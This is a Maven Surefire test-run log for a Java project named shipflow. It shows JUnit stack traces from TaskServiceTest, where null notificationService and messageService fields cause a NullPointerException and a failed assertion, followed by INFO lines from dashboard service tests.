	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:49.289Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TaskService       : Failed to send task update notifications for task 1

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.DashboardNotificationService.notifyTaskPriorityChange(com.github.farzadsedaghatbin.shipflow.entity.Task, com.github.farzadsedaghatbin.shipflow.entity.enums.TaskPriority)" because "this.notificationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:327) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.updateTask_WhenExists_ShouldUpdateTask(TaskServiceTest.java:201) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[ERROR] Tests run: 22, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.078 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.deleteTask_WhenNotExists_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "Task not found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.deleteTask(TaskService.java:374)
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.lambda$deleteTask_WhenNotExists_ShouldThrowException$3(TaskServiceTest.java:246)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.deleteTask_WhenNotExists_ShouldThrowException(TaskServiceTest.java:246)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.deleteTask_WhenNotExists_ShouldThrowException(TaskServiceTest.java:248)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.PitchHealthServiceConfigurableThresholdsTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.249 s -- in com.github.farzadsedaghatbin.shipflow.service.PitchHealthServiceConfigurableThresholdsTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomDashboardServiceTest$UserContextFilterTests
2026-01-17T23:26:49.652Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggling user context filter for dashboard 1 (user: 1)
2026-01-17T23:26:49.652Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggled user context filter to true for dashboard 1
2026-01-17T23:26:49.654Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggling user context filter for dashboard 1 (user: 1)
2026-01-17T23:26:49.654Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomDashboardService   : Toggled user context filter to true for dashboard 1
